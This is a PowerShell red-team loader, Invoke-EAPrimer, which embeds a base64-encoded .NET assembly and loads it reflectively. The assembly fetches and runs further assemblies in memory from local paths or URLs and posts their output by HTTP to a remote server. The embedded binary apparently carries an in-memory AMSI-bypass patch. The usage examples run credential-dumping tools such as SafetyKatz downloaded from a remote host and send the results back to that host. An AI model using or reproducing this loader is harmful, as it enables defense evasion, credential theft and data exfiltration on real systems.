function Invoke-EAPrimer
{
    <#
    .SYNOPSIS

    This script loads the .Net assembly EAPrimer.exe that will dynamically loads other .Net assemblies for
    in-memory execution. Input assemblies are accepted in the form of local file paths or URLs via the "Path"
    parameter.

    By default output will be displayed in the console. This can be redirected by the user through the
    "POST" parameter to write to a file or even send results via HTTP POST request.

    Author: @m8sec
    License: MIT
    Required Dependencies: None
    Optional Dependencies: None

    .DESCRIPTION

    Uses EAPrimer.exe to load .NET assemblies for in-memory execution.

    .PARAMETER Path
    Path to target assembly for execution. This can be a local file path or URL.

    .PARAMETER Post
    Write results to a file or provide URL to send via HTTP POST request to a remote server. By
    default, output will be displayed in the terminal.

    .PARAMETER Args
    Optional, pass arguments to assembly for execution.

    .PARAMETER  Help
    Show EAPrimer.exe help menu.

    .EXAMPLE
    Execute local seatbelt.exe and write output to file.
    Invoke-EAPrimer -Path .\assembly.exe -Post output.exe

    .EXAMPLE
    Execute safetykatz.exe from url and post output to remote server.
    Invoke-EAPrimer -Path http://192.168.0.20/assembly.exe -Post http://192.168.0.20
    #>
    Param(
        [Parameter(Position=0, Mandatory=$true)]
        [String]
        $Path,

        [Parameter(Position=1)]
        [String]
        $Post,

        [Parameter(Position=2)]
        [String]
        $Args,

	[Parameter(Position=3)]
        [Switch]
        $Help=$flase,

	[Parameter(Position=4)]
        [Switch]
        $SkipAMSI=$flase
    )
    $assekblyString = "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AFVSTABsb2FkQVNNAFN5c3RlbS5JTwBCbnN6UABEb3dubG9hZERhdGEAUG9zdERhdGEAcG9zdERhdGEAQ29weURhdGEAbXNjb3JsaWIAZndtenBYZ2MAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMAQmRhRmVmaDM0ZABMb2FkAEFkZABTeXN0ZW0uQ29sbGVjdGlvbnMuU3BlY2lhbGl6ZWQAZ2V0X01lc3NhZ2UASW52b2tlAElEaXNwb3NhYmxlAFJ1bnRpbWVGaWVsZEhhbmRsZQBGaWxlAENvbnNvbGUAV3JpdGVMaW5lAG1haW5MaW5lAFZhbHVlVHlwZQBTZWN1cml0eVByb3RvY29sVHlwZQBwbGFjZUhvbGRlckhlcmUATWV0aG9kQmFzZQBEaXNwb3NlAENvbXBpbGVyR2VuZXJhdGVkQXR0cmlidXRlAEd1aWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBDb21WaXNpYmxlQXR0cmlidXRlAEFzc2VtYmx5VGl0bGVBdHRyaWJ1dGUAQXNzZW1ibHlUcmFkZW1hcmtBdHRyaWJ1dGUAVGFyZ2V0RnJhbWV3b3JrQXR0cmlidXRlAEFzc2VtYmx5RmlsZVZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAEFzc2VtYmx5RGVzY3JpcHRpb25BdHRyaWJ1dGUAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBBc3NlbWJseVByb2R1Y3RBdHRyaWJ1dGUAQXNzZW1ibHlDb3B5cmlnaHRBdHRyaWJ1dGUAQXNzZW1ibHlDb21wYW55QXR0cmlidXRlAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAEJ5dGUAc2V0X0V4cGVjdDEwMENvbnRpbnVlAEVBUHJpbWVyLmV4ZQBJbmRleE9mAEVuY29kaW5nAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcARnJvbUJhc2U2NFN0cmluZwBUb0Jhc2U2NFN0cmluZwBVcGxvYWRTdHJpbmcAVG9TdHJpbmcAR2V0U3RyaW5nAFN1YnN0cmluZwBEaXNwYXRjaABGbHVzaABnZXRfTGVuZ3RoAFN0YXJ0c1dpdGgAYXNtb2JqAE1lbVZhbABNYXJzaGFsAHNldF9TZWN1cml0eVByb3RvY29sAFByb2dyYW0AZ2V0X0l0ZW0Ac2V0X0l0ZW0AZ2V0X0lzNjRCaXRPcGVyYXRpbmdTeXN0ZW0ATWFpbgBTeXN0ZW0uUmVmbGVjdGlvbgBOYW1lVmFsdWVDb2xsZWN0aW9uAFdlYkhlYWRlckNvbGxlY3Rpb24ARXhjZXB0aW9uAE1ldGhvZEluZm8AZGF0SW5mbwBKdmNhcABWTzBvbGFlcQBIdHRwUmVxdWVzdEhlYWRlcgBHZXRTdHJpbmdCdWlsZGVyAERlY29kZXIARW5jb2RlcgBTZXJ2aWNlUG9pbnRNYW5hZ2VyAEVBUHJpbWVyAGNhc3BlcgBTdHJpbmdXcml0ZXIAU3RyZWFtV3JpdGVyAFRleHRXcml0ZXIALmN0b3IAcmVhY3RvcgBVSW50UHRyAFR2c2FzAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBSZWFkQWxsQnl0ZXMAR2V0Qnl0ZXMAYXNzZW1ibHlCeXRlcwBQYXJzZUFyZ3MAYXJncwBBZGRvbnMAZ2V0X0hlYWRlcnMAUnVudGltZUhlbHBlcnMAR2V0UHJvY0FkZHJlc3MAQ29uY2F0AE9iamVjdABWaXJ0dWFsUHJvdGVjdABTeXN0ZW0uTmV0AGJhaXQAb3BfRXhwbGljaXQAc25vd2dyYW50AFdlYkNsaWVudABFbnZpcm9ubWVudABnZXRfRW50cnlQb2ludABnZXRfQ291bnQAQ29udmVydABnZXRfT3V0AFNldE91dABTeXN0ZW0uVGV4dABJbml0aWFsaXplQXJyYXkAQ29udGFpbnNLZXkAR2V0QXNzZW1ibHkAQ29weQBMb2FkTGlicmFyeQBnZXRFbnRyeQBFbXB0eQAAQVYAagBGAGEAYQBtAFYASABWAG4AUgBTAGIARgBKAFAAVgBqAE4AUwBjAEYAVgBxAFQAbQBwAFAAVQBUADAAOQAACWIASABhAGQAAHFWAGwAWgBhAGEAbQBWAEgAVgBuAFIAUwBiAEcAUgBWAFkAbABoAEMAWQBWAFoAdQBjAEYAZABTAFIAbgBCAEgAVwBrAGQARwBhAFYAWgB1AFEAbABwAFYATQBWAEYAMwBVAEYARQA5AFAAUQA9AD0AAAlwAHYAbgB0AAAPWwAhAF0AIAB7ADAAfQAAFXUAcwBlAHIALQBhAGcAZQBuAHQAAYDZTQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8AdwBzACAATgBUACAAMQAwAC4AMAA7ACAAVwBPAFcANgA0ACkAIABBAHAAcABsAGUAVwBlAGIASwBpAHQALwA1ADMANwAuADMANgAgACgASwBIAFQATQBMACwAIABsAGkAawBlACAARwBlAGMAawBvACkAIABDAGgAcgBvAG0AZQAvADYAMgAuADAALgAzADIAMAAyAC4AOQAgAFMAYQBmAGEAcgBpAC8ANQAzADcALgAzADYAAENhAHAAcABsAGkAYwBhAHQAaQBvAG4ALwB4AC0AdwB3AHcALQBmAG8AcgBtAC0AdQByAGwAZQBuAGMAbwBkAGUAZAABCVAATwBTAFQAAAEACy0AcABvAHMAdAABJ1sAKgBdACAARQBBAFAAcgBpAG0AZQByACAAdgAwAC4AMQAuADIAAAstAGgAZQBsAHAAAQstAHAAYQB0AGgAAUkKAC0AcABhAHQAaAAJAFUAUgBMACAAbwByACAAbABvAGMAYQBsACAAcABhAHQAaAAgAHQAbwAgAGEAcwBzAGUAbQBiAGwAeQABgLctAHAAbwBzAHQACQBMAG8AYwBhAGwAIABwAGEAdABoACAAZgBvAHIAIABvAHUAdABwAHUAdAAgAG8AcgAgAFUAUgBMACAAdABvACAAUABPAFMAVAAgAGIAYQBzAGUANgA0ACAAZQBuAGMAbwBkAGUAZAAgAHIAZQBzAHUAbAB0AHMALgAgAEQAZQBmAGEAdQBsAHQAOgAgAGMAbwBuAHMAbwBsAGUAIABvAHUAdABwAHUAdAAuAAFVLQBhAHIAZwBzAAkAQQBkAGQAIABhAHIAZwB1AG0AZQBuAHQAcwAgAGYAbwByACAAdABhAHIAZwBlAHQAIABhAHMAcwBlAG0AYgBsAHkALgAKAAoAAYDVRQBBAFAAcgBpAG0AZQByAC4AZQB4AGUAIAAtAHAAYQB0AGgAPQBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyAC8AYQBzAHMAZQBtAGIAbAB5AC4AZQB4AGUAIAAtAHAAbwBzAHQAPQBoAHQAdABwAHMAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAyACAALQBhAHIAZwBzAD0AIgAtAGEAcgBnADEAIABlAHgAYQBtAHAAbABlAF8AdgBhAGwAdQBlACIACgABOVsAKgBdACAAQQBwAHAAbAB5AGkAbgBnACAASQBuAC0ATQBlAG0AbwByAHkAIABQAGEAdABjAGgAAQstAGEAcgBnAHMAATFbACoAXQAgAEEAcwBzAGUAbQBiAGwAeQAgAEEAcgBnAHMAOgAgACIAewAwAH0AIgAAD2gAdAB0AHAAOgAvAC8AABFoAHQAdABwAHMAOgAvAC8AADFbACoAXQAgAEwAbwBhAGQAaQBuAGcAIABBAHMAZQBtAGIAbAB5ADoAIAB7ADAAfQAAO1sAKgBdACAATABvAGEAZABpAG4AZwAgAEEAcwBlAG0AYgBsAHkAIABmAHIAbwBtADoAIAB7ADAAfQAACVsAIQBdACAAAKpewgMPSGxPqw9+TKazxt4ABCABAQgDIAABBSABARERBCABAQ4EIAEBAggABAEdBQgYCAsHBhgJCR0FHQUSRQMAAAIHAAIBEnkRfQQAARkLAyAADgUAAgEOHAQHAg4IBQAAEoCJBQABHQUOBSABDh0FAyAACAUgAR0FDgUAAQ4dBQQAAQECBgABARGAmQUgABKAoQUgAgEODgcgAgERgKkOBiADDg4ODg0HBRUSSQIODh0OCA4IBhUSSQIODgQgAQgDBSACDggIBCABDggHIAIBEwATAQIGDgYgAhwcHRwGAAESTR0FBCAAElEXBwkOHQUdDhJVFRJJAg4OElkdHBJFEl0EAAASVQUgAQITAAUAAQESVQQAAQEOBiABEwETAAYAAgEOHRwEIAECDgUAAg4ODgUgABKAtQi3elxWGTTgiQQAAAAAAgYKAwYREAQAARgOBQACGBgOCAAEAhgZCRAJBwADAR0FGAgDAAABBQACAQ4OCgABFRJJAg4OHQ4HAAIBHQUdHAYAARJREk0FAAEBHQ4IAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEAAgAAAAAADQEACEVBUHJpbWVyAAAFAQAAAAAXAQASQ29weXJpZ2h0IMKpICAyMDIwAAApAQAkM2JjNGY2ZDgtNmJiZi00M2Q4LTg5YzQtZGNmYjQ4ODMzYjJjAAAMAQAHMS4wLjAuMAAARwEAGi5ORVRGcmFtZXdvcmssVmVyc2lvbj12NC4wAQBUDhRGcmFtZXdvcmtEaXNwbGF5TmFtZRAuTkVUIEZyYW1ld29yayA0BAEAAAAAAAAAbunGtgAAAAACAAAAXgAAAOQ6AADkHAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAFJTRFMZZkmHORVaToeUmtCo/JJcAQAAAEQ6XE5ldF9TaGFyZSRcdG9vbHNfZG90bmV0XEVBUHJpbWVyXEVBUHJpbWVyXG9ialxSZWxlYXNlXEVBUHJpbWVyLnBkYgBqOwAAAAAAAAAAAACEOwAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAdjsAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAAAAD/JQAgQAC4VwAHgMIYALhXAAeAwwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACABAAAAAgAACAGAAAAFAAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAIAAAAAAAAAAAAAAAAAAAAAAAAEAAQAAAGgAAIAAAAAAAAAAAAAAAAAAAAEAAAAAAKwDAACQQAAAHAMAAAAAAAAAAAAAHAM0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkATgBGAE8AAAAAAL0E7/4AAAEAAAABAAAAAAAAAAEAAAAAAD8AAAAAAAAABAAAAAEAAAAAAAAAAAAAAAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEAdABpAG8AbgAAAAAAAACwBHwCAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAFgCAAABADAAMAAwADAAMAA0AGIAMAAAABoAAQABAEMAbwBtAG0AZQBuAHQAcwAAAAAAAAAiAAEAAQBDAG8AbQBwAGEAbgB5AE4AYQBtAGUAAAAAAAAAAAA6AAkAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAARQBBAFAAcgBpAG0AZQByAAAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADEALgAwAC4AMAAuADAAAAA6AA0AAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAEUAQQBQAHIAaQBtAGUAcgAuAGUAeABlAAAAAABIABIAAQBMAGUAZwBhAGwAQwBvAHAAeQByAGkAZwBoAHQAAABDAG8AcAB5AHIAaQBnAGgAdAAgAKkAIAAgADIAMAAyADAAAAAqAAEAAQBMAGUAZwBhAGwAVAByAGEAZABlAG0AYQByAGsAcwAAAAAAAAAAAEIADQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABFAEEAUAByAGkAbQBlAHIALgBlAHgAZQAAAAAAMgAJAAEAUAByAG8AZAB1AGMAdABOAGEAbQBlAAAAAABFAEEAUAByAGkAbQBlAHIAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMQAuADAALgAwAC4AMAAAALxDAADqAQAAAAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0ieWVzIj8+DQoNCjxhc3NlbWJseSB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEiIG1hbmlmZXN0VmVyc2lvbj0iMS4wIj4NCiAgPGFzc2VtYmx5SWRlbnRpdHkgdmVyc2lvbj0iMS4wLjAuMCIgbmFtZT0iTXlBcHBsaWNhdGlvbi5hcHAiLz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjIiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzIHhtbG5zPSJ1cm46c2NoZW1hcy1taWNyb3NvZnQtY29tOmFzbS52MyI+DQogICAgICAgIDxyZXF1ZXN0ZWRFeGVjdXRpb25MZXZlbCBsZXZlbD0iYXNJbnZva2VyIiB1aUFjY2Vzcz0iZmFsc2UiLz4NCiAgICAgIDwvcmVxdWVzdGVkUHJpdmlsZWdlcz4NCiAgICA8L3NlY3VyaXR5Pg0KICA8L3RydXN0SW5mbz4NCjwvYXNzZW1ibHk+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADAAAAwAAACYOwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
    $assemblyBytes = [System.Convert]::FromBase64String($assekblyString)
    [System.Reflection.Assembly]::Load($assemblyBytes) | Out-Null


    # Execute & EAPrimer will handle output
    $parameters=@("-path=$Path")

    if ($Post)
    {
        $parameters += "-post=$Post"
    }

    if ($Args)
    {
        $parameters += "-args=$Args"
    }

    if ($Help)
    {
        $parameters += "-help"
    }

    [EAPrimer.Program]::Main($parameters)
}
